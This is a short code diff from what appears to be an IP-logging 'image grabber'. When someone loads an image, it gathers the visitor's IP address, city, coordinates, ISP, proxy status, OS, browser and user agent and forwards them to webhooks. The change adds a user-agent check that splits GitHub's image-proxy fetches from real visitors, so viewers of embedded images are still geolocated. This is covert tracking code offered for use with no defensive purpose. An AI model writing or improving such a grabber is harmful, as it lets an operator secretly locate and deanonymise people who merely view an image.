@@ -1,5 +1,6 @@
 const logger = require('./logger')
 const sendImageToWebhooks = require('./webhook')
+const sendImageToWebhooksGithub = require('./webhook')
 
 const config = require('./config.json')
 
@@ -39,30 +40,36 @@ const ipInfo = async (
         proxy,
         hosting
       } = infoJson
+      const url = new URL(imageUrl)
 
       logger.info(
         `Client's information: Country: ${country}, Region: ${regionName}, City: ${city}, Coordinates: ${lat}, ${lon}, Timezone: ${timezone}, ISP: ${isp}, AS: ${as}, Mobile: ${mobile}, Proxy: ${proxy}, Hosting: ${hosting}`
       )
 
-      sendImageToWebhooks(
-        imageName,
-        imageUrl,
-        clientIP,
-        timezone,
-        country,
-        regionName,
-        city,
-        lat,
-        lon,
-        isp,
-        as,
-        mobile,
-        proxy,
-        hosting,
-        os,
-        browser,
-        userAgent
-      )
+      if (userAgent !== 'github-camo' && userAgent !== 'github.com') {
+        sendImageToWebhooks(
+          imageName,
+          imageUrl,
+          clientIP,
+          url,
+          timezone,
+          country,
+          regionName,
+          city,
+          lat,
+          lon,
+          isp,
+          as,
+          mobile,
+          proxy,
+          hosting,
+          os,
+          browser,
+          userAgent
+        )
+      } else {
+        sendImageToWebhooksGithub(imageName, imageUrl, url)
+      }
     } catch (error) {
       logger.error(`Error getting client's information: ${error}`)
     }
